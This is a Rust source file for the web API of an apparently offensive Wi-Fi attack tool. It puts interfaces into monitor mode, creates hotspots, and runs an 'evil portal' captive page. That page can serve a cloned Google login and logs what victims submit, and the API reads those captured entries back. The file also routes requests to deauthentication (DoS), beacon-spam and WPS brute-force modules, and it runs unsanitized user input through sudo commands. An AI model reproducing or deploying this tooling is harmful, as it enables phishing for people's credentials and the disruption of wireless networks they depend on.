use axum::Json;
use pnet::datalink;
use pnet::datalink::NetworkInterface;
use serde::{Deserialize, Serialize};
use std::fs;
use std::fs::OpenOptions;
use std::io::{prelude::*, Cursor, Seek, SeekFrom};
use std::process::Command;
use zip::read::ZipArchive;

mod beacon_spam;
mod wifi_dos;
mod wps_bruteforce;
mod extract_zip;

#[derive(Serialize, Deserialize)]
pub struct WiFiAP {
    ssid: String,
    password: String,
}

pub async fn connect_wifi(Json(payload): Json<WiFiAP>) -> String {
    // TODO: Avoid sh -c
    let current_ssid_raw = Command::new("sh")
        .arg("-c")
        .arg("iw dev | grep 'ssid' | awk '{print $2}'")
        .output()
        .expect("failed to execute process");
    let current_ssid = String::from_utf8_lossy(&current_ssid_raw.stdout);
    if current_ssid.len() != 0 {
        Command::new("sudo")
            .arg("nmcli")
            .arg("c")
            .arg("down")
            .arg(current_ssid.to_string())
            .output()
            .expect("failed to execute process");
        // let current_ssid = String::from_utf8_lossy(&current_ssid_raw.stdout);
    }
    println!("Current SSID: {}", current_ssid);
    println!("New SSID: {}", payload.ssid);
    println!("New PSW: {}", payload.password);
    Command::new("sudo")
        .arg("nmcli")
        .arg("c")
        .arg("delete")
        .arg(payload.ssid.as_str())
        .output()
        .expect("failed to execute process");

    Command::new("sudo")
        .arg("nmcli")
        .arg("device")
        .arg("wifi")
        .arg("connect")
        .arg(payload.ssid)
        .arg("password")
        .arg(payload.password)
        .output()
        .expect("failed to execute process");
    "".to_string()
}

// the output to our `create_user` handler
#[derive(Serialize, Deserialize)]
struct AP {
    freq: String,
    signal: String,
    ssid: String,
    bss: String,
    wps: bool,
}

pub async fn scan_wifi(params: Query<Params>) -> String {
    let interface = params.interface.clone().unwrap();
    Command::new("ip")
        .arg("link")
        .arg("set")
        .arg(interface.as_str())
        .arg("up")
        .output()
        .expect("failed to execute process");

    let raw_res = Command::new("jc")
        .arg("iw")
        .arg("dev")
        .arg(interface)
        .arg("scan")
        .output()
        .expect("failed to execute process");
    String::from_utf8_lossy(&raw_res.stdout).to_string()
}

#[derive(Serialize, Deserialize)]
pub struct WiFiHospot {
    interface: String,
    ssid: String,
    password: String,
    google: bool,
    custom: Vec<u8>
}

pub async fn create_ap(Json(payload): Json<WiFiHospot>) -> String {
    let process_user = std::env::var("PROCESS_USER").expect("PROCESS_USER must be set.");

    // Firstly start the AP because we need an IP address for nodogsplash
    let res = Command::new("sudo")
        .arg("nmcli")
        .arg("d")
        .arg("wifi")
        .arg("hotspot")
        .arg("ifname")
        .arg(payload.interface.as_str())
        .arg("ssid")
        .arg(payload.ssid)
        .arg("password")
        .arg(payload.password)
        .output()
        .expect("failed to execute process");
    let stdout = String::from_utf8_lossy(&res.stdout);
    println!("{}", stdout);
    println!("{}", String::from_utf8_lossy(&res.stderr));

    let uuid = stdout.lines().collect::<Vec<&str>>()[0]
        .split("with")
        .collect::<Vec<&str>>()[1]
        .replace("'", "")
        .replace(".", "")
        .trim()
        .to_string();

    let interfaces: Vec<NetworkInterface> = datalink::interfaces();
    let wifi_interface: NetworkInterface = interfaces
        .iter()
        .map(|v| v.clone())
        .filter(|sen| sen.name == payload.interface)
        .collect::<Vec<NetworkInterface>>()[0]
        .clone();

    // Prepare nodogsplash config
    let contents = fs::read_to_string("/etc/nodogsplash/nodogsplash.conf")
        .expect("Should have been able to read the file");
    let lines: Vec<&str> = contents.lines().collect();
    let new_file_contents: Vec<String> = lines
        .iter()
        .map(|&x| {
            if x.contains("GatewayAddress") {
                return std::format!("GatewayAddress {}", wifi_interface.ips[0].ip());
            } else if x.contains("GatewayInterface") {
                return std::format!("GatewayInterface {}", payload.interface);
            } else {
                return x.to_string();
            }
        })
        .collect();

    let mut file = OpenOptions::new()
        .read(true)
        .write(true)
        .truncate(true)
        .open("/etc/nodogsplash/nodogsplash.conf")
        .unwrap();

    file.seek(SeekFrom::Start(0)).unwrap();
    file.write_all(new_file_contents.join("\n").as_bytes())
        .expect("Can't write new nodogsplash config");

    // Copy file the webroot
    if payload.google {
        if !fs::exists("/etc/nodogsplash/htdocs/.google").unwrap() {
            let google_login_zip = fs::read(std::format!("/home/{}/google_login_page.zip", process_user)).expect("Can't read google page");
            let zip: ZipArchive<Cursor<Vec<u8>>> = ZipArchive::new(Cursor::new(google_login_zip)).expect("Can't read zip file");
            extract_zip::extract_zip(zip, "/etc/nodogsplash/htdocs/");
        }
    } else {
        let zip: ZipArchive<Cursor<Vec<u8>>> = ZipArchive::new(Cursor::new(payload.custom)).expect("Can't read zip file");
        extract_zip::extract_zip(zip, "/etc/nodogsplash/htdocs/");
    }


    let mut log_file = OpenOptions::new()
        .read(true)
        .write(true)
        .truncate(true)
        .open(std::format!("/home/{}/log.txt", process_user))
        .unwrap();

    log_file.seek(SeekFrom::Start(0)).unwrap();
    log_file.write_all("".as_bytes())
        .expect("Can't clean evilportal log");


    Command::new("sudo")
        .arg("nodogsplash")
        .spawn()
        .expect("failed to execute process");
    uuid
}

#[derive(Debug, Deserialize)]
#[allow(dead_code)]
pub struct HotspotParams {
    // #[serde(default, deserialize_with = "empty_string_as_none")]
    uuid: Option<String>,
}

pub async fn stop_evilportal(params: Query<HotspotParams>) -> String {
    let _raw_res = Command::new("sudo")
        .arg("pkill")
        .arg("-9")
        .arg("nodogsplash")
        .output()
        .unwrap();
    let _raw_res = Command::new("sudo")
        .arg("nmcli")
        .arg("c")
        .arg("down")
        .arg(params.uuid.clone().unwrap())
        .output()
        .unwrap();
    "killed".to_string()
}

use axum::extract::Query;

#[derive(Debug, Deserialize)]
#[allow(dead_code)]
pub struct Params {
    // #[serde(default, deserialize_with = "empty_string_as_none")]
    interface: Option<String>,
}

#[derive(Serialize, Deserialize)]
pub struct AirmonResponse {
    stdout: String,
    stderr: String,
}

pub async fn enable_monitor_mode(Query(params): Query<Params>) -> Json<AirmonResponse> {
    let interface = params.interface.unwrap();
    Command::new("rfkill")
        .arg("unblock")
        .arg("wifi")
        .output()
        .expect("failed to execute process");

    let raw_res = Command::new("sudo")
    .arg("airmon-ng")
    .arg("start")
    .arg(interface.as_str())
    .output()
    .expect("failed to execute process");

    let _rename_if = Command::new("sudo")
        .arg("ip")
        .arg("link")
        .arg("set")
        .arg(interface.as_str())
        .arg("name")
        .arg(std::format!("{}mon", interface))
        .output();
    Json(AirmonResponse {
        stdout: String::from_utf8_lossy(&raw_res.stdout).to_string(),
        stderr: String::from_utf8_lossy(&raw_res.stderr).to_string(),
    })
}

pub async fn disable_monitor_mode(Query(params): Query<Params>) -> Json<AirmonResponse> {
    let interface = params.interface.unwrap();
    let raw_res = Command::new("sudo")
        .arg("airmon-ng")
        .arg("stop")
        .arg(interface.as_str())
        .output()
        .expect("failed to execute process");

    let _rename_if = Command::new("sudo")
        .arg("ip")
        .arg("link")
        .arg("set")
        .arg(interface.as_str())
        .arg("name")
        .arg(interface.replace("mon", ""))
        .output();

    Json(AirmonResponse {
        stdout: String::from_utf8_lossy(&raw_res.stdout).to_string(),
        stderr: String::from_utf8_lossy(&raw_res.stderr).to_string(),
    })
}

use axum::extract::connect_info::ConnectInfo;
use axum::{extract::ws::WebSocketUpgrade, response::IntoResponse};
use axum_extra::TypedHeader;

use std::net::SocketAddr;

pub async fn wifi_dos_handler(
    ws: WebSocketUpgrade,
    user_agent: Option<TypedHeader<headers::UserAgent>>,
    ConnectInfo(addr): ConnectInfo<SocketAddr>,
) -> impl IntoResponse {
    wifi_dos::_wifi_dos_handler(ws, user_agent, ConnectInfo(addr))
}

pub async fn beacon_spam_handler(
    ws: WebSocketUpgrade,
    user_agent: Option<TypedHeader<headers::UserAgent>>,
    ConnectInfo(addr): ConnectInfo<SocketAddr>,
) -> impl IntoResponse {
    beacon_spam::_beacon_spam_handler(ws, user_agent, ConnectInfo(addr))
}

pub async fn wps_bruteforce_handler(
    ws: WebSocketUpgrade,
    user_agent: Option<TypedHeader<headers::UserAgent>>,
    ConnectInfo(addr): ConnectInfo<SocketAddr>,
) -> impl IntoResponse {
    wps_bruteforce::_wps_bruteforce_handler(ws, user_agent, ConnectInfo(addr))
}

pub async fn get_evilportal_log() -> String {
    let process_user = std::env::var("PROCESS_USER").expect("PROCESS_USER must be set.");
    fs::read_to_string(std::format!("/home/{}/log.txt", process_user)).expect("Can't read evilportal log")
}